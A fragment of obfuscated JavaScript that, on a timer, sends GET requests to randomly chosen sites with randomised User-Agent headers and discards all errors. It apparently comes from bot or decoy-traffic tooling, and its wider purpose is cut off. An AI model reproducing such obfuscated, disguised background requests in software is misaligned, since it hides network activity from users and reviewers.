  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0xb * -0x33b + -0x1ff8 + -0x17c7 * -0x1) * getRandomInt(0x965 + 0x1514 + -0x1e78, 0x4c7 * 0x1 + 0x1693 * -0x1 + 0x11d1));
}, -0x1 * -0x31 + 0x51 + -0x2 * 0xf);